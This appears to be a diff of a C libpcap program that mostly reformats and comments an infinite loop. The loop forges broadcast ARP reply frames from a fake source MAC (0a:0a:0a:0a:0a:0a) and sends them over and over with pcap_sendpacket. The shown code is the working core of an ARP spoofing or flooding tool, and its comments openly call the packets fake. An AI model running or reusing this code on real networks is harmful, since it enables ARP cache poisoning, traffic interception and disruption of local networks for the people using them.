@@ -58,7 +58,11 @@ int main(int argc, char **argv)
 	}
 
 	while(1){	
-	struct arp_frame buffer;
+
+	//build	data link layer frame header
+	//it is a broadcast frame
+	//with a fake mac address
+	//and up layer type is 0x806 (arp)
 	buffer.eth_hdr.ether_dhost[0] = 0xff;
 	buffer.eth_hdr.ether_dhost[1] = 0xff;
 	buffer.eth_hdr.ether_dhost[2] = 0xff;
@@ -76,30 +80,23 @@ int main(int argc, char **argv)
 	buffer.eth_hdr.ether_type = htons(0x0806);
 
 
-
-		//send fake arp response
-		//memcpy(eptr->ether_dhost, eptr->ether_shost, 6);
-		buffer.arp_pkt.ether_dhost[0] = 0xff;
-		buffer.arp_pkt.ether_dhost[1] = 0xff;
-		buffer.arp_pkt.ether_dhost[2] = 0xff;
-		buffer.arp_pkt.ether_dhost[3] = 0xff;
-		buffer.arp_pkt.ether_dhost[4] = 0xff;
-		buffer.arp_pkt.ether_dhost[5] = 0xff;	
-		
+	buffer.arp_pkt.ether_dhost[0] = 0xff;
+	buffer.arp_pkt.ether_dhost[1] = 0xff;
+	buffer.arp_pkt.ether_dhost[2] = 0xff;
+	buffer.arp_pkt.ether_dhost[3] = 0xff;
+	buffer.arp_pkt.ether_dhost[4] = 0xff;
+	buffer.arp_pkt.ether_dhost[5] = 0xff;	
 	
-		buffer.arp_pkt.op = htons(2);
+	buffer.arp_pkt.op = htons(2);
 		
-		
-		//memcpy(arpptr->ether_dhost, arpptr->ether_shost, 6);
-		
-		buffer.arp_pkt.ether_shost[0] = 0xa;
-		buffer.arp_pkt.ether_shost[1] = 0xa;
-		buffer.arp_pkt.ether_shost[2] = 0xa;
-		buffer.arp_pkt.ether_shost[3] = 0xa;
-		buffer.arp_pkt.ether_shost[4] = 0xa;
-		buffer.arp_pkt.ether_shost[5] = 0xa;
+	buffer.arp_pkt.ether_shost[0] = 0xa;
+	buffer.arp_pkt.ether_shost[1] = 0xa;
+	buffer.arp_pkt.ether_shost[2] = 0xa;
+	buffer.arp_pkt.ether_shost[3] = 0xa;
+	buffer.arp_pkt.ether_shost[4] = 0xa;
+	buffer.arp_pkt.ether_shost[5] = 0xa;
 
-		pcap_sendpacket(handle, (u_char *)&buffer, sizeof(buffer));
+	pcap_sendpacket(handle, (u_char *)&buffer, sizeof(buffer));
 	}
 	
 	pcap_close(handle);
